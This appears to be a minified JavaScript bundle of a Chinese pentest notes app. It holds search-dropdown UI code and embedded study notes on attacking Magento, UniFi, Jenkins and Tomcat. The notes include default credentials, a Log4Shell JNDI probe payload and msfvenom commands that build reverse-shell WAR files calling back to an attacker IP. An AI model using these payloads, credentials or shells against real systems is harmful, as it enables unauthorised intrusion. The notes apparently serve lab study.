P.xX_BrowserEventMap.KEYBOARD.KeyCode_MAP.A:{$.ctrlKey&&vu(!0);break}default:break}},\u6CE8\u610F\u6709\u5EF6\u65F6__\u5F53\u7CBE\u786E\u5339\u914D\u5230\u503C_\u7F29\u56DEDropDown____\u6B64\u5904_\u5B98\u65B9AntD\u7684API\u8BBE\u8BA1\u6709\u8BEF_\u65E0\u6CD5\u5728onChange\u91CC\u89E6\u53D1________\u53D8\u901A\u65B9\u6848_\u5728filterOption\u65B9\u6CD5\u91CC_\u4F1A\u89E6\u53D1:function($){clearTimeout(Du),Du=window.setTimeout(function(){X(!1)},$),uu.Ref\u5B9A\u4F4D.executeScroll()},\u8FD9\u4E2A\u5C5E\u6027\u5176\u5B9E\u65E0\u6548\u5E76\u4E0D\u751F\u6548____autoClearSearchValue____\u6B64\u5904\u7684\u8BDD_\u4E3A\u4E86\u89E3\u51B3\u4E00\u4E2A\u95EE\u9898_filterOption\u81EA\u52A8\u9009\u4E2D\u540E____\u4F1A\u6E05\u7A7A\u6240\u6709\u6587\u672C__\u6240\u4EE5_\u8FDB\u884C\u5173\u95ED:!1,allowClear____\u51FA\u4E8E\u65E0\u5948_\u4FEE\u590DBug:!1,\u6700\u540E_\u53EA\u80FD\u5C1D\u8BD5\u4FEE\u6539\u548C_onSearch\u73AF\u8282_\u7684\u62FC\u63A5:function($,fu){var pu,Tu=$;$.length===1&&fu.length>0&&(Tu=fu+$);var Mu=((pu=window.getSelection())===null||pu===void 0?void 0:pu.type)!=="Range";return{search_\u6700\u65B0\u7684_\u5904\u7406\u62FC\u63A5\u60C5\u51B5\u7684:Tu,need\u66F4\u6539Search____\u6709\u6587\u5B57\u5168\u9009\u65F6_\u4E0D\u6E05\u9664____\u4F46\u662F_\u597D\u50CF\u5374\u662F\u6709\u4E00\u4E2A\u65F6\u5DEE\u989D\u989D\u989D\u989D\u989D\u989D____\u6240\u4EE5\u5BFC\u81F4\u6C38\u8FDC\u4E3Atrue:Mu,is\u524D\u4E00\u523BSelectAll_\u72B6\u6001:lu,\u6062\u590D_SelectAll_\u72B6\u6001_fn:function(){vu(!1)}}}}}(),iu=Object(E.p)(null),cu=Object(t.a)(iu,3),Bu=cu[1],Au=cu[2];Object(E.m)(Fu,function(){return{invokeSearch_\u6700\u7EC8\u5E9F\u5F03\u4E86:function(){},set_selectFocus:function(){var K;(K=Au.current)===null||K===void 0||K.focus()}}});function yu(G,K){var N=G.trim().split(/[\s：，。]+/mg);return N.some(function(X){_.a.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD[X]===void 0&&_.a.\u5904\u7406\u62FC\u97F3\u90E8\u5206_key\u5C06\u4F1A\u81EA\u52A8\u8F6C\u5316\u4E3A\u5C0F\u5199([X]);var ou=K==null?void 0:K.includes(X),Cu=!1;K!==void 0&&(Cu=_.a.\u6BD4\u8F83_\u8FDE\u7EED\u62FC\u97F3(K,X));var lu=!1;K!==void 0&&(lu=_.a.\u6BD4\u8F83_\u62FC\u97F3\u9996\u5B57\u6BCD(K,X));var vu=!1;return K!==void 0&&(vu=_.a.\u4EFB\u610F\u6BD4\u8F83_\u901A\u8FC7\u7B2C\u4E09\u65B9\u5E93\u5224\u65AD(K,X)),ou||Cu||lu||vu||!1})}return Object(l.useEffect)(function(){_.a.\u5904\u7406\u62FC\u97F3\u90E8\u5206_key\u5C06\u4F1A\u81EA\u52A8\u8F6C\u5316\u4E3A\u5C0F\u5199(Eu._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr)},[]),Object(l.useEffect)(function(){var G=f.bind_\u672A\u805A\u7126\u65F6_\u7A7A\u683C\u805A\u7126(function(K){if(A.current&&!Z.current){var N;(N=Au.current)===null||N===void 0||N.focus(),K.preventDefault()}});return function(){G()}},[]),r.a.createElement("div",null,r.a.createElement("div",{id:uu.ID\u5B9A\u4F4D.\u951A\u70B9anchor_\u5B9A\u4F4DID,ref:uu.Ref\u5B9A\u4F4D.ref,style:{marginBottom:"0.0em"}},function(){var G,K=(G=Su.\u641C\u7D22sort_SaveLoad.loadData____\u5141\u8BB8\u90E8\u5206\u6570\u636E\u6B8B\u7F3A().selectTimes_map)!==null&&G!==void 0?G:{};return Object.entries(K).filter(function(N){var X,ou=Object(t.a)(N,2),Cu=ou[0],lu=ou[1];return lu>=((X=Hu==null?void 0:Hu.minTime__\u9ED8\u8BA4\u503C2)!==null&&X!==void 0?X:2)}).sort(function(N,X){var ou=Object(t.a)(N,2),Cu=ou[0],lu=ou[1],vu=Object(t.a)(X,2),Iu=vu[0],Du=vu[1];return-1*(lu-Du)}).map(function(N){var X=Object(t.a)(N,2),ou=X[0],Cu=X[1];return r.a.createElement(O.a,{style:{},onClick:function(){su(ou)}},ou,"\uFF1A",Cu)})}()),r.a.createElement(a.a,Object(h.a)({showSearch:!0,mode:"multiple"},C.a._\u4FEE\u590D_\u7591\u96BE\u6742\u75C7_\u4E0B\u62C9\u6846\u770B\u4E0D\u5230\u7684\u4E8B\u4EF6,{allowClear:!0,onClear:function(){},value:gu,ref:function(K){Object(E.g)(K,function(N){Au.current===null&&Bu(N),A.current||N==null||N.focus()})},onFocus:function(){Q(!0)},onBlur:function(){Q(!1)},placeholder:"Select a person",optionFilterProp:"children",onSelect:function(K,N){Su.add_selectTime_forOneItem([K])},onChange:function(G){function K(N){return G.apply(this,arguments)}return K.toString=function(){return G.toString()},K}(function(G){eu(G),nu.\u6CE8\u610F\u6709\u5EF6\u65F6__\u5F53\u7CBE\u786E\u5339\u914D\u5230\u503C_\u7F29\u56DEDropDown____\u6B64\u5904_\u5B98\u65B9AntD\u7684API\u8BBE\u8BA1\u6709\u8BEF_\u65E0\u6CD5\u5728onChange\u91CC\u89E6\u53D1________\u53D8\u901A\u65B9\u6848_\u5728filterOption\u65B9\u6CD5\u91CC_\u4F1A\u89E6\u53D1(void 0)}),searchValue:Yu,onSearch:function(G){function K(N){return G.apply(this,arguments)}return K.toString=function(){return G.toString()},K}(function(G){var K=G,N=nu.\u6700\u540E_\u53EA\u80FD\u5C1D\u8BD5\u4FEE\u6539\u548C_onSearch\u73AF\u8282_\u7684\u62FC\u63A5(G,Yu),X=N.search_\u6700\u65B0\u7684_\u5904\u7406\u62FC\u63A5\u60C5\u51B5\u7684,ou=N.need\u66F4\u6539Search____\u6709\u6587\u5B57\u5168\u9009\u65F6_\u4E0D\u6E05\u9664____\u4F46\u662F_\u597D\u50CF\u5374\u662F\u6709\u4E00\u4E2A\u65F6\u5DEE\u989D\u989D\u989D\u989D\u989D\u989D____\u6240\u4EE5\u5BFC\u81F4\u6C38\u8FDC\u4E3Atrue,Cu=N.is\u524D\u4E00\u523BSelectAll_\u72B6\u6001,lu=N.\u6062\u590D_SelectAll_\u72B6\u6001_fn;if(Cu)K=G,lu();else if(ou)K=X;else throw new Error("\u5509\uFF0C\u8FD9\u91CC\u6C38\u8FDC\u4E3ATrue");su(K),f.disableFocus(Uu)}),onClick:function(){f.disableFocus(Uu)},open:nu.dropdown_open,onDropdownVisibleChange:nu.onDropdownVisibleChange,onInputKeyDown:nu.onInputKeyDown,filterSort:function(K,N){var X=Su.length_sort(K,N),ou=-1*Su.selectTime_sort(K,N),Cu=X+ou,lu=K.value,vu=N.value;return[lu,vu].includes("nmap"),Cu},filterOption:function(K,N){var X,ou=K.trim(),Cu=N==null||(X=N.value)===null||X===void 0?void 0:X.toLowerCase(),lu=ou.toLowerCase();if(lu===Cu&&nu.dropdown_open&&nu.\u6CE8\u610F\u6709\u5EF6\u65F6__\u5F53\u7CBE\u786E\u5339\u914D\u5230\u503C_\u7F29\u56DEDropDown____\u6B64\u5904_\u5B98\u65B9AntD\u7684API\u8BBE\u8BA1\u6709\u8BEF_\u65E0\u6CD5\u5728onChange\u91CC\u89E6\u53D1________\u53D8\u901A\u65B9\u6848_\u5728filterOption\u65B9\u6CD5\u91CC_\u4F1A\u89E6\u53D1(2e3),ou.length<=0)return!1;if(Ee)try{return yu(lu,Cu)}catch(vu){alert("\u51FA\u9519\u5566\uFF0C\u5EFA\u8BAE\u67E5\u770B\u63A7\u5236\u53F0");debugger;return!1}else return(Cu==null?void 0:Cu.includes(lu))||!1}}),function(){var G;switch(ru){case"\u624B\u52A8\u679A\u4E3E\u65B9\u5F0F":G=Object.keys(v);break;case"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F":G=Eu._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr;break;default:throw new Error("\u4E0D\u5B58\u7684\u60C5\u51B5")}return G.map(function(K){return r.a.createElement(a.a.Option,{value:K},K)})}()))}),L=n("u8mv"),J=n("FW8I"),q=n("fOrg"),V=n("+KLJ"),tu=n("550Q"),Y=n("AJpP"),au=function(){var U="1px  dashed  black";return{_\u7CBE\u786E\u5339\u914D:{border:U,borderColor:Y.green[3-1]},_\u6A21\u7CCA\u5339\u914D:{border:U,borderColor:Y.blue[3-1]}}}(),hu=function(Fu){var ru=Fu.showHeaders,Eu=Fu.questionHeaders_\u5C06\u591A\u4E2A\u7ED3\u679C\u7684\u6B63\u6587_\u7EC4\u5408\u8FDE\u63A5\u5728\u4E00\u8D77_\u5728\u5934\u90E8\u989D\u5916\u663E\u793A_\u4E00\u822C\u6CA1\u5F00\u542F_arr,eu=Fu.\u7CBE\u786E\u5339\u914D_\u591A\u4E2ABean_arr,su=Fu._\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",null,ru&&Object(E.f)(Eu.map(function(gu){return r.a.createElement("pre",null,gu)}),r.a.createElement("div",{style:{margin:"2em 0 1em 0",width:"8em",height:"2px",background:"#FF7800"}})),r.a.createElement("div",{style:Object(y.a)({},au._\u7CBE\u786E\u5339\u914D)},r.a.createElement(V.a,{message:r.a.createElement("div",null,"\u7CBE\u786E\u5339\u914D \uFF08\u5171 ",r.a.createElement("h1",{style:{display:"inline-block",fontSize:"102px",color:"#FF7800",lineHeight:"1",marginBottom:"12px"}},eu.reduce(function(gu,Yu){var Ee=gu;return Yu.forEach(function(Hu){Ee+=1}),Ee},0))," \u6761\uFF09"),description:"\u63CF\u8FF0",type:"success",showIcon:!0}),eu.map(function(gu){return r.a.createElement(tu.a,{\u5019\u9009_BeanArr:gu,\u9009\u4E2D\u5173\u952E\u5B57_arr_\u53EF\u4EE5\u4F9B\u9AD8\u4EAE:su})}))))},mu=function(Fu){var ru=Fu.show_\u6A21\u7CCA\u5339\u914D,Eu=Fu.\u6A21\u7CCA\u5339\u914D_\u591A\u4E2ABean_arr,eu=Fu._\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr;return r.a.createElement(r.a.Fragment,null,ru&&r.a.createElement("div",{style:{marginTop:"1em"}},r.a.createElement("div",{style:Object(y.a)({},au._\u6A21\u7CCA\u5339\u914D)},r.a.createElement(V.a,{message:r.a.createElement("div",null,"\u6A21\u7CCA\u5339\u914D"),description:r.a.createElement("div",{style:{display:"flex"}},r.a.createElement("span",{style:{whiteSpace:"pre"}},"\u63CF\u8FF0"),r.a.createElement("h1",{style:{lineHeight:"1em"}},"\uFF08\u5EF6\u4F38\u6761\u76EE\u7684\u3010\u6B63\u5219\u3011\uFF0C\u5339\u914D\u4E86\u7CBE\u786E\u6761\u76EE\u7684\u3010\u5B8C\u6574\u6587\u672C\u3011\uFF09")),type:"info",showIcon:!0}),Eu.map(function(su){return r.a.createElement(tu.a,{\u5019\u9009_BeanArr:su,\u9009\u4E2D\u5173\u952E\u5B57_arr_\u53EF\u4EE5\u4F9B\u9AD8\u4EAE:eu})}))))},Pu=function(){function U(){Object(T.a)(this,U)}return Object(R.a)(U,null,[{key:"\u83B7\u53D6_keywordsCfgMap",value:function(ru,Eu,eu){var su,gu;switch(Eu){case"\u624B\u52A8\u679A\u4E3E\u65B9\u5F0F":{gu=v[ru],su=x;break}case"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F":{gu=ru,su=eu;break}default:throw new Error("\u8FD9\u79CD\u60C5\u51B5\u4E0D\u5B58\u5728")}return{keywordsCfgMap:su,input_enum_or_string:gu}}}]),U}(),qu=n("6EgL"),Qu=Object(E.h)(function(U,Fu){var ru=U.cfgType,Eu=U.additionDescription,eu=U.\u81EA\u52A8Helper_instance,su=U.showHeaders,gu=su===void 0?!0:su,Yu=U.show_\u6A21\u7CCA\u5339\u914D,Ee=Yu===void 0?!0:Yu,Hu=U.enable\u62FC\u97F3\u641C\u7D22,Su=Hu===void 0?!0:Hu,oe=U.defaultOption_arr,re=U.on_\u4E0B\u62C9\u6846_\u6539\u53D8\u4E86\u9009\u9879\u5185\u5BB9,se=re===void 0?function(bu){}:re,Uu=U.is_\u542F\u7528\u5FEB\u6377\u641C\u7D22\u7684\u6309\u94AE\u7EC4,A=Uu===void 0?!0:Uu,W=U.selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg,k=Object(l.useState)([]),z=Object(t.a)(k,2),Q=z[0],Z=z[1],uu=Object(l.useState)([]),nu=Object(t.a)(uu,2),iu=nu[0],cu=nu[1],Bu=Object(l.useState)([]),Au=Object(t.a)(Bu,2),yu=Au[0],G=Au[1],K=Object(l.useState)([]),N=Object(t.a)(K,2),X=N[0],ou=N[1],Cu=Object(l.useState)(""),lu=Object(t.a)(Cu,2),vu=lu[0],Iu=lu[1],Du=L.b.\u5FEB\u901F\u521B\u5EFA_\u5FEB\u901F\u641C\u7D22\u7684_state(),du=Object(t.a)(Du,2),$=du[0],fu=du[1];A&&L.b.bind_\u5FEB\u6377\u952E_\u641C\u7D22(function(){return $.\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2});var pu=Object(l.useRef)(null),Tu=Object(l.useState)(!0),Mu=Object(t.a)(Tu,2),ju=Mu[0],Ju=Mu[1];Object(E.m)(Fu,function(){return{change_searchText:function(_u){var Vu;te(_u),(Vu=pu.current)===null||Vu===void 0||Vu.set_selectFocus()}}});function te(bu){if(Iu(bu),bu.length!==0){var _u=bu.toLowerCase(),Vu=Pu.\u83B7\u53D6_keywordsCfgMap(_u,ru,eu._\u6B63\u5219\u5173\u952E\u5B57_BeanMap),ae=Vu.keywordsCfgMap,ue=e.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(_u,ae),ce=ue.map(function(xu){return xu.occurs}).flat(1).map(function(xu){return xu.text_index_1}),Ru=F.a.noRepeat_rtnNew(ce);ou(Ru),Lu(Ru)}}function Lu(bu){if(Array.isArray(bu)||alert("\u6B64\u5904\u6CE8\u610F\u903B\u8F91\uFF0C\u5E94\u8BE5\u662F\u4E00\u4E2A\u5B57\u7B26\u4E32\u6570\u7EC4\u2014\u2014\u2014\u2014\u591A\u9009"),se(bu),A){let xu=function(){var Zu=!1,ku=(Zu?[bu[0]]:Object(S.a)(bu)).filter(function(ee){return!!ee});ku=ku.sort(function(ee,me){return-1*((ee==null?void 0:ee.length)-(me==null?void 0:me.length))}),L.a._\u79FB\u9664_\u4E4B\u524D\u7684\u5DF2\u641C\u7D22\u5173\u952E\u5B57_\u9AD8\u4EAE("\u7591\u96BE\u6742\u75C7_\u641C\u7D22"),setTimeout(function(){var ee=J.c.\u62FC\u63A5\u591A\u4E2A\u6B63\u5219\u6216\u5B57\u7B26\u4E32__\u4E2D\u95F4\u586B\u5145\u4E3A_0\u4E2A\u548C\u4EE5\u4E0A____\u975E\u7A7A\u767D____\u6BD4\u5982\u5B57\u6BCD\u6570\u5B57\u7B26\u53F7([Object(S.a)(ku)]);L.a.mark\u6807\u8BB0_regexp(ee,"\u7591\u96BE\u6742\u75C7_\u641C\u7D22")},.3*1e3)};fu({\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2:bu}),xu()}var _u=[],Vu=[],ae=[];function ue(){}function ce(xu,Zu){return xu.filter(function(ku){return ku.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.includes(Zu)}).map(function(ku){return ku.question.join(`
 ---- 
`)}).join(`
\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014
`)}function Ru(xu){var Zu=Pu.\u83B7\u53D6_keywordsCfgMap(xu,ru,eu._\u6B63\u5219\u5173\u952E\u5B57_BeanMap),ku=Zu.keywordsCfgMap,ee=Zu.input_enum_or_string,me=ce(ku,ee),ge=e.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(me,ku.filter(function(Nu){return Nu.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.find(function(Ou){return Ou.includes(ee)})!==void 0})),fe=e.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(me,ku);ae.includes(me)||(_u.push(ge),Vu.push(fe.filter(function(Nu){return!ge.find(function(Ou){return Ou.keyWCfg.name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528===Nu.keyWCfg.name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528})})),ae.push(me))}bu.forEach(function(xu){Ru(xu)}),ou(bu),Z([].concat(_u)),cu([].concat(Vu)),G([].concat(ae)),qu.a.getStore().dispatch_effect\u5F02\u6B65Promise_reducers\u540C\u6B65({type:"my_custom_store/sync_set____\u5F53\u524D_\u7591\u96BE\u6742\u75C7____\u5F53\u524D\u9009\u4E2D\u5173\u952E\u8BCDarr",payload:{\u5F53\u524D\u7591\u96BE\u6742\u75C7_cpKey:W.cp_key____\u89C6\u4E3A\u72EC\u4E00\u65E0\u4E8CKey,\u9009\u4E2D\u5173\u952E\u8BCD_arr:bu}})}function zu(){var bu=oe==null?void 0:oe.map(function(Vu){return Vu.toLowerCase()});if(bu){var _u;ou(bu),Lu(bu),(_u=pu.current)===null||_u===void 0||_u.invokeSearch_\u6700\u7EC8\u5E9F\u5F03\u4E86()}}Object(l.useEffect)(function(){zu()},[]);var ie=!0;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",null,A&&L.b.ui_\u663E\u793A_\u641C\u7D22\u6309\u94AE(function(){return $.\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2})),r.a.createElement("div",{className:c()(m.a.questionWra,I.a.question_search_Wra)},Eu,ju&&r.a.createElement(M,{ref:pu,cfgType:ru,\u81EA\u52A8Helper_instance:eu,onChange:Lu,onSearch:te,searchValue:vu,enable\u62FC\u97F3\u641C\u7D22:Su,valueArr:X,selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg:W}),ie?r.a.createElement("div",{style:{height:"0.5em"}}):r.a.createElement(r.a.Fragment,null,r.a.createElement("br",null),r.a.createElement("br",null),r.a.createElement("br",null),r.a.createElement("br",null)),r.a.createElement(hu,{showHeaders:gu,questionHeaders_\u5C06\u591A\u4E2A\u7ED3\u679C\u7684\u6B63\u6587_\u7EC4\u5408\u8FDE\u63A5\u5728\u4E00\u8D77_\u5728\u5934\u90E8\u989D\u5916\u663E\u793A_\u4E00\u822C\u6CA1\u5F00\u542F_arr:yu,\u7CBE\u786E\u5339\u914D_\u591A\u4E2ABean_arr:Q,_\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr:X}),r.a.createElement(mu,{show_\u6A21\u7CCA\u5339\u914D:Ee,\u6A21\u7CCA\u5339\u914D_\u591A\u4E2ABean_arr:iu,_\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr:X}),r.a.createElement("div",{style:{height:"40vh"}})))}),Wu=d.a=Qu},XjqV:function(H,d,n){"use strict";n.d(d,"b",function(){return E}),n.d(d,"a",function(){return p});var S=n("Pv/L"),t=n("tJVT"),l=n("q1tI"),r=n.n(l),e=n("/qoP"),u=n("qtNK"),m=n("jJ7j"),E={name:"Express",content:Promise.all([Promise.resolve().then(n.bind(null,"jEKr"))]).then(function(I){var g=Object(t.a)(I,1),c=g[0];return r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      Express\u662F\u4E00\u4E2A\u6700\u5C0F\u4E14\u7075\u6D3B\u7684  Node.JS  Web\u5E94\u7528\u7A0B\u5E8F\u6846\u67B6\uFF0C\u4E3AWeb\u63D0\u4F9B\u4E86\u5F3A\u5927\u7684\u529F\u80FD\u96C6    \u548C\u79FB\u52A8\u5E94\u7528\u7A0B\u5E8F\u3002
      `,Object(e.d)({\u667A\u80FD\u6B65\u9AA4_cfg:c.NodeJS_SSTI_cfg})))})},F={name:"\u3010CMS\u3011_\u624B\u518C",steps:[E,{name:"\u3010Magento\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u767B\u5F55\u5BC6\u7801\uFF1A

              \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
                  admin/123123

              \u5F3A\u5EA6\u8981\u6C42\uFF1A
                  \u5BC6\u7801\u81F3\u5C117\u4E2A\u5B57\u7B26
                  \u5305\u542B\u5B57\u6BCD\u548C\u6570\u5B57

              \u5BC6\u7801\u7206\u7834\u601D\u8DEF
                  \u53EF\u4EE5\u4ECE\u3010\u8BCD\u5178\u5B50\u6A21\u5757\u2014\u2014\u9AD8\u9891\u5F31\u5BC6\u7801\u3011\u4E2D\uFF0C\u627E\u7B26\u5408\u3010\u5F3A\u5EA6\u8981\u6C42\u3011\u7684\u3002

          `))},{name:"\u3010UniFi\u3011 / \u3010UniFi Network\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7531 Ubiquiti Networks \u5F00\u53D1
              \u7528\u4E8E\u5E2E\u52A9\u8BBE\u7F6E\u548C\u7BA1\u7406 UniFi Network \u8BBE\u5907\uFF0C\u4EE5\u53CA\u5BF9\u7F51\u7EDC\u6D41\u91CF\u3001\u5B89\u5168\u6027\u548C\u65E0\u7EBF\u6027\u80FD\u8FDB\u884C\u5168\u9762\u76D1\u7763\u548C\u63A7\u5236

          CVE\u5206\u6790\uFF1A
              CVE-2021-44228
                  https://blog.morphisec.com/log4j-exploit-targets-vulnerable-unifi-network-applications
                  \u8F83\u8BE6\u7EC6\uFF1Ahttps://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

                  \u6D4B\u8BD5\u5E94\u7528\u7A0B\u5E8F\u662F\u5426\u6613\u53D7\u653B\u51FB\u7684\u4E3B\u8981\u65B9\u6CD5\u662F\u5C06\u6B64\u6F0F\u6D1E\u4E0E DNS Canary \u4EE4\u724C\uFF08\u7A0D\u540E\u5C06\u63D0\u4F9B\u66F4\u591A DNS Canary\uFF09\u76F8\u7ED3\u5408\uFF0C\u65B9\u6CD5\u662F\u5C06\uFF1A\${jndi:ldap://<DNS-Canary-Token>/a}\u653E\u5165\u5C3D\u53EF\u80FD\u591A\u7684\u8F93\u5165\u5B57\u6BB5\u4EE5\u53CA\u4EFB\u4F55\u67E5\u8BE2\u53EF\u80FD\u6613\u53D7\u653B\u51FB\u7684\u5185\u5BB9
                      \u5C06\u6570\u636E\u653E\u5728\u5B50\u57DF\u4E2D\u800C\u4E0D\u662F\u4F5C\u4E3A URL \u7684\u539F\u56E0\u662F\u56E0\u4E3A LDAP \u5305\u88C5\u5668\u4E0D\u53D1\u9001 URL
                          \u4F7F\u7528\u6B64\u6F0F\u6D1E\u5229\u7528 DNS \u7A83\u53D6\u6570\u636E\u8981\u5BB9\u6613\u5F97\u591A
                      DNS \u662F\u6700\u53EF\u9760\u7684\u670D\u52A1\u4E4B\u4E00\uFF0C\u56E0\u4E3A\u8BE5\u670D\u52A1\u6700\u4E0D\u53EF\u80FD\u88AB\u963B\u6B62\u3002


                  \u9A8C\u8BC1\uFF1A
                      \u7B2C\u4E00\u6B65\uFF1A\u542F\u52A8\u3010tcpdump\u3011\uFF0C\u76D1\u542C\u3010LDAP\u3011
                      \u7B2C\u4E8C\u6B65\uFF1A\u3010UniFi\u3011\u7684\u3010remember\u3011\u5B57\u6BB5\uFF0C\u586B\u5165\u3010ldap\u670D\u52A1\u3011\u7684\u3010\u6307\u4EE4\u3011\u3002
                      \u7B2C\u4E09\u6B65\uFF0C\u53D1\u9001\u4E0A\u8FF0\u8BF7\u6C42\uFF0C\u89C2\u5BDF\u3010tcpdump\u3011\u6355\u6349\u6D41\u91CF

          \u9ED8\u8BA4\u914D\u7F6E\uFF1A
              \u9ED8\u8BA4\u6570\u636E\u5E93\uFF1A\u3010ace\u3011
                  \u9ED8\u8BA4\u7BA1\u7406\u5458\u8868\uFF1A\u3010admin\u3011
              \u9ED8\u8BA4\u7BA1\u7406\u5458\uFF1A\u3010administrator\u3011

          \u901A\u7528\u529F\u80FD\uFF1A
              \u754C\u9762\u9762\u677F\uFF1A
                  \u6DFB\u52A0\u7F51\u7AD9
                  Dashboard
                  Map\u56FE
                  Devices\u8BBE\u5907
                  Clients\u5BA2\u6237\u7AEF
                  Statistic\u7EDF\u8BA1
                  Insight                 \uFF08\uFF1F\uFF1F\uFF1F\uFF09

                  Events\uFF0C\u7CFB\u7EDF\u4E8B\u4EF6
                  Alerts\uFF0C
                  Settings\uFF0C
                      \u5F88\u591A\u7EC6\u9879
                      \u3010Site\u3011
                          \u3010Device Authentication\u3011
                              UniFi \u63D0\u4F9B SSH \u8EAB\u4EFD\u9A8C\u8BC1\u8BBE\u7F6E\uFF0C\u8BE5\u529F\u80FD\u5141\u8BB8\u60A8\u4ECE\u63A7\u5236\u53F0\u6216\u7EC8\u7AEF\u901A\u8FC7 SSH \u7BA1\u7406\u5176\u4ED6\u63A5\u5165\u70B9\u3002

                              \u53EF\u4EE5\u76F4\u63A5\u770B\u5230\u3010\u8D26\u53F7\u3011\u548C\u3010\u5BC6\u7801\u3011\u3002

          `))},{name:"\u3010Jenkins\u3011\u3001\u30108080\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A

              \u7B2C\u4E00\u4EF6\u4E8B\uFF0C\u8981\u505A\u7684\uFF0C\u5C31\u662F
                  \u3010\u5DF2\u77E5\u7248\u672C\u3011\uFF0C\u662F\u5426\u6709\u3010CVE\u3011\u6216\u8005\u3010\u5176\u5B83\u653B\u51FB\u65B9\u5F0F\u3011\uFF0C\u5728\u7F51\u4E0A\u5DF2\u516C\u5F00\u3002

              \u811A\u672C\u7F16\u5199
                  Jenkins Script Console
                  Groovy Script snippet


          `,Object(e.d)({\u667A\u80FD\u6B65\u9AA4_cfg:u.a})))},{name:"\u3010Tomcat\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          Tomcat

              \u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
                  \u8D44\u6599\uFF1A
                      Tomcat\u4E00\u4E9B\u5E38\u89C1\u7684\u9ED8\u8BA4\uFF1A
                          https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
                          HTB\u63D0\u4F9B\u7684\u8D44\u6599\uFF1Ahttps://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
                      \u4E5F\u5305\u62EC\uFF0C\u5176\u5B83\u670D\u52A1\u5668\u7684\u9ED8\u8BA4\uFF1A
                          https://github.com/netbiosX/Default-Credentials

              \u5BC6\u7801\u7206\u7834\u5DE5\u5177
                  \u3010tomcat-brute.py\u3011
                      \u8D44\u6599\uFF1Ahttps://github.com/deo-gracias/oscp/blob/12ed698ac0575bcebd9d489945ab63a2dbd7f6f4/scripts/tomcat-brute.py


              War\u6587\u4EF6\u90E8\u7F72 / War file to deploy
                  \u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF1A
                      \u4E0A\u4F20\u6587\u4EF6
                          msfvenom
                              \u521B\u5EFA\u4E00\u4E2Ashell\uFF0C\u4EE5war\u5305\u7684\u5F62\u5F0F
                                  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
                                  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

                              \u3010ppaejmsg.jsp\u3011\u6587\u4EF6\u7684\u9605\u8BFB\u89E3\u8BFB\uFF1A
                                  123

                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F\uFF1A
                      \u4F7F\u7528\u3010make-war.sh\u3011+\u3010jsp File browser 1.2\u3011
                          \u8D44\u6599\uFF1A
                              \u3010make-war.sh\u3011\uFF0C\u53EA\u662F\u4E00\u4E2A\u7B80\u5355\u7684\u5305\u88C5\u811A\u672C\uFF1A\u7565
